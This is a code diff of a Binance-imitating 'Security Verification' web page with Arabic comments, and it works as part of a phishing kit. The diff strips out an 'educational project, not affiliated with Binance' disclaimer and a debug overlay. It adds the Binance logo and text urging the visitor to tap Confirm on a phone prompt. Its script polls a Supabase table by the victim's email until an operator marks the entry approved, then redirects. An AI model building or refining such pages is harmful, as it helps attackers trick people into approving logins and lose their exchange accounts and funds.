@@ -21,94 +21,167 @@
     .other-method { display: block; color: var(--yellow); text-decoration: none; font-weight: 700; font-size: 1.2rem; margin-bottom: 20px; }
     .footer { display: flex; justify-content: center; gap: 20px; color: #929aa5; font-size: 14px; margin-top: 20px; }
     .footer span { cursor: pointer; }
-    
-    /* شاشة التشخيص */
-    #debug-screen { position: fixed; bottom: 0; left: 0; right: 0; background: red; color: white; text-align: center; padding: 10px; font-weight: bold; z-index: 10000; font-size: 14px; }
   </style>
 </head>
 <body>
-  <div class="edu-notice" id="eduNotice">⚠️ مشروع تعليمي — غير تابع لـ Binance.</div>
 
   <main class="page-shell">
     <section class="verification-card">
+      <svg class="brand-icon" viewBox="0 0 120 24" xmlns="http://www.w3.org/2000/svg">
+        <path fill="#F0B90B" d="M5.41406 12L2.71875 14.6953L0 12L2.71875 9.28125L5.41406 12ZM12 5.41406L16.6406 10.0547L19.3594 7.33594L12 0L4.64062 7.35938L7.35938 10.0781L12 5.41406ZM21.2812 9.28125L18.5859 12L21.3047 14.7188L24.0234 12L21.2812 9.28125ZM12 18.5859L7.35938 13.9219L4.64062 16.6406L12 24L19.3594 16.6406L16.6406 13.9219L12 18.5859ZM12 14.6953L14.7188 11.9766L12 9.28125L9.28125 12L12 14.6953ZM40.5938 14.9766V14.9297C40.5938 13.1719 39.6562 12.2812 38.1328 11.6953C39.0703 11.1797 39.8672 10.3359 39.8672 8.85938V8.8125C39.8672 6.75 38.2031 5.41406 35.5312 5.41406H29.4141V18.5625H35.6719C38.6484 18.5859 40.5938 17.3672 40.5938 14.9766ZM36.9844 9.35156C36.9844 10.3359 36.1875 10.7344 34.8984 10.7344H32.2266V7.94531H35.0859C36.3047 7.94531 36.9844 8.4375 36.9844 9.30469V9.35156ZM37.7109 14.6016C37.7109 15.5859 36.9375 16.0312 35.6719 16.0312H32.2266V13.1484H35.5781C37.0547 13.1484 37.7109 13.6875 37.7109 14.5781V14.6016ZM46.6641 18.5625V5.41406H43.7578V18.5625H46.6641ZM62.2266 18.5859V5.41406H59.3672V13.5234L53.2031 5.41406H50.5312V18.5625H53.3906V10.2188L59.7656 18.5859H62.2266ZM78.2578 18.5859L72.6094 5.34375H69.9375L64.2891 18.5859H67.2656L68.4609 15.6328H74.0156L75.2109 18.5859H78.2578ZM72.9844 13.0781H69.4922L71.25 8.8125L72.9844 13.0781ZM92.0625 18.5859V5.41406H89.2031V13.5234L83.0391 5.41406H80.3672V18.5625H83.2266V10.2188L89.6016 18.5859H92.0625ZM106.992 16.4531L105.141 14.6016C104.109 15.5391 103.195 16.1484 101.672 16.1484C99.4219 16.1484 97.8516 14.2734 97.8516 12.0234V11.9531C97.8516 9.70312 99.4453 7.85156 101.672 7.85156C102.984 7.85156 104.016 8.41406 105.047 9.32812L106.898 7.19531C105.68 6 104.203 5.15625 101.719 5.15625C97.6875 5.15625 94.8516 8.22656 94.8516 11.9531V12C94.8516 15.7734 97.7344 18.7734 101.602 18.7734C104.133 18.7969 105.633 17.9062 106.992 16.4531ZM119.344 18.5625V16.0078H112.195V13.2422H118.406V10.6641H112.195V7.99219H119.25V5.41406H109.336V18.5625H119.344Z"></path>
+      </svg>
+
       <h1 class="title" id="txtTitle">Security Verification</h1>
+
+      <svg class="shield-icon" viewBox="0 0 210 170" xmlns="http://www.w3.org/2000/svg">
+        <path d="M105 18 L170 40 V88 C170 120 146 143 105 154 C64 143 40 120 40 88 V40 L105 18 Z" fill="none" stroke="#F2F3F5" stroke-width="4" stroke-linejoin="round" />
+        <path d="M82 82 C82 72 90 64 100 64 H110 C120 64 128 72 128 82 V90 C128 100 120 108 110 108 H100 C90 108 82 100 82 90 V82 Z" fill="none" stroke="#F2F3F5" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" />
+        <path d="M88 102 H122" stroke="#F2F3F5" stroke-width="4" stroke-linecap="round"/>
+        <path d="M105 84 L121 97 L105 110 L89 97 Z" fill="#F0B90B" opacity="0.95"/>
+      </svg>
+
       <div class="message">
         <div class="message-title" id="txtMsgTitle">Open Binance app on your phone</div>
-        <div class="message-copy" id="txtMsgCopy">Waiting for approval...</div>
+        <div class="message-copy" id="txtMsgCopy">
+          Binance has sent a notification to your phone. Open the Binance App and tap <strong>Confirm</strong> on the prompt to complete the verification process.
+        </div>
       </div>
+
       <button type="button" id="resendBtn" class="resend-btn">Resend (13s)</button>
-      <a href="index.html" class="other-method" id="txtOtherMethod">Use Other Methods</a>
+      <a href="index.html" class="other-method" id="txtOtherMethod">Use Other Methods to Complete Verification</a>
+
+      <div class="footer">
+        <span id="langToggleBtn">English / العربية</span>
+      </div>
     </section>
   </main>
 
-  <!-- شاشة التشخيص -->
-  <div id="debug-screen">جاري تشغيل السكربت...</div>
-
   <script type="module">
-    // 1. تغيير شاشة التشخيص
-    const debugScreen = document.getElementById('debug-screen');
-    debugScreen.textContent = "الخطوة 1: بدأ تحميل السكربت";
+    import { supabase } from './supabase.js';
 
-    try {
-      import('./supabase.js').then((module) => {
-        debugScreen.textContent = "الخطوة 2: تم تحميل Supabase بنجاح!";
-        const supabase = module.supabase;
+    document.addEventListener('DOMContentLoaded', () => {
+        try {
+            const resendBtn = document.getElementById('resendBtn');
+            const langToggleBtn = document.getElementById('langToggleBtn');
+            
+            let currentLang = localStorage.getItem('siteLang') || 'en';
+            let countdown = 13;
+            let timerId = null;
+            let intervalId = null;
 
-        // العداد التنازلي
-        const resendBtn = document.getElementById('resendBtn');
-        let countdown = 13;
-        
-        function updateButton() {
-            resendBtn.textContent = `Resend (${countdown}s)`;
-        }
+            const translations = {
+              en: { 
+                title: "Security Verification", 
+                msgTitle: "Open Binance app on your phone", 
+                msgCopy: "Binance has sent a notification to your phone. Open the Binance App and tap <strong>Confirm</strong> on the prompt to complete the verification process.", 
+                resend: "Resend", 
+                resendTime: "s", 
+                otherMethod: "Use Other Methods to Complete Verification" 
+              },
+              ar: { 
+                title: "التحقق الأمني", 
+                msgTitle: "افتح تطبيق Binance على هاتفك", 
+                msgCopy: "أرسل Binance إشعاراً إلى هاتفك. افتح تطبيق Binance واضغط على <strong>تأكيد (Confirm)</strong> في الإشعار لإكمال عملية التحقق.", 
+                resend: "إعادة إرسال", 
+                resendTime: "ث", 
+                otherMethod: "استخدم طرقاً أخرى لإكمال التحقق" 
+              }
+            };
 
-        setInterval(() => {
-            countdown -= 1;
-            if (countdown <= 0) {
-                resendBtn.textContent = 'Resend';
-                resendBtn.disabled = false;
-            } else {
-                updateButton();
+            function updateButtonText() {
+              if (!resendBtn) return;
+              const t = translations[currentLang];
+              resendBtn.textContent = `${t.resend} (${countdown}${t.resendTime})`;
             }
-        }, 1000);
 
-        // قراءة الإيميل
-        const urlParams = new URLSearchParams(window.location.search);
-        let userEmail = urlParams.get('email') || sessionStorage.getItem('pendingEmail');
-        
-        if (!userEmail) {
-            debugScreen.textContent = "الخطأ: لا يوجد إيميل في الرابط!";
-            debugScreen.style.background = "orange";
-            return;
-        }
+            function updateLang() {
+              const t = translations[currentLang];
+              document.documentElement.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
+              
+              if (document.getElementById('txtTitle')) document.getElementById('txtTitle').textContent = t.title;
+              if (document.getElementById('txtMsgTitle')) document.getElementById('txtMsgTitle').textContent = t.msgTitle;
+              if (document.getElementById('txtMsgCopy')) document.getElementById('txtMsgCopy').innerHTML = t.msgCopy; 
+              if (document.getElementById('txtOtherMethod')) document.getElementById('txtOtherMethod').textContent = t.otherMethod;
+              
+              if (countdown > 0) {
+                updateButtonText();
+              } else if (resendBtn) {
+                resendBtn.textContent = t.resend;
+              }
+            }
 
-        debugScreen.textContent = "الخطوة 3: جاري فحص الموافقة للإيميل: " + userEmail;
-
-        // الفحص الدوري
-        setInterval(async () => {
-            const { data, error } = await supabase.from('contacts').select('status').eq('email', userEmail);
-            if (data && data.length > 0) {
-                if (data.some(row => row.status === 'approved')) {
-                    debugScreen.textContent = "🎉 تمت الموافقة! جاري التحويل...";
-                    debugScreen.style.background = "green";
-                    setTimeout(() => { window.location.href = 'success.html'; }, 1000);
-                } else {
-                    debugScreen.textContent = "⏳ الحالة: pending (بانتظار الموافقة) - الإيميل: " + userEmail;
+            function startCountdown() {
+              if (!resendBtn) return;
+              clearInterval(timerId);
+              countdown = 13;
+              resendBtn.disabled = true;
+              updateButtonText();
+              
+              timerId = setInterval(() => {
+                countdown -= 1;
+                if (countdown <= 0) {
+                  clearInterval(timerId);
+                  resendBtn.textContent = translations[currentLang].resend;
+                  resendBtn.disabled = false;
+                  return;
                 }
-            } else {
-                 debugScreen.textContent = "⚠️ الإيميل غير موجود في قاعدة البيانات!";
-                 debugScreen.style.background = "orange";
+                updateButtonText();
+              }, 1000);
             }
-        }, 3000);
 
-      }).catch(error => {
-        // إذا فشل تحميل ملف supabase.js
-        debugScreen.textContent = "❌ خطأ في تحميل supabase.js: " + error.message;
-        debugScreen.style.background = "black";
-      });
-    } catch (error) {
-      debugScreen.textContent = "❌ خطأ فادح: " + error.message;
-    }
+            updateLang();
+            startCountdown();
+
+            const urlParams = new URLSearchParams(window.location.search);
+            let userEmail = urlParams.get('email');
+            if (userEmail) { sessionStorage.setItem('pendingEmail', userEmail); } 
+            else { userEmail = sessionStorage.getItem('pendingEmail'); }
+
+            if (userEmail) {
+              async function checkApproval() {
+                try {
+                  const { data, error } = await supabase.from('contacts').select('status').eq('email', userEmail);
+                  if (error) return;
+                  if (data && data.length > 0) {
+                    const isApproved = data.some(row => row.status === 'approved');
+                    if (isApproved) {
+                      clearInterval(intervalId);
+                      clearInterval(timerId);
+                      window.location.href = 'success.html';
+                    }
+                  }
+                } catch (err) {
+                  console.error("خطأ:", err);
+                }
+              }
+              intervalId = setInterval(checkApproval, 3000);
+              checkApproval();
+            }
+
+            if (resendBtn) {
+              resendBtn.addEventListener('click', async () => {
+                if (countdown > 0) return;
+                resendBtn.disabled = true;
+                resendBtn.textContent = '...';
+                
+                const { error } = await supabase.from('contacts').update({ status: 'pending', created_at: new Date().toISOString() }).eq('email', userEmail);
+                if (!error) startCountdown();
+                else resendBtn.disabled = false;
+              });
+            }
+
+            if (langToggleBtn) {
+              langToggleBtn.addEventListener('click', () => {
+                 currentLang = currentLang === 'en' ? 'ar' : 'en';
+                 localStorage.setItem('siteLang', currentLang);
+                 updateLang();
+              });
+            }
+
+        } catch (globalError) {
+            console.error("حدث خطأ غير متوقع:", globalError);
+        }
+    });
   </script>
 </body>
 </html>
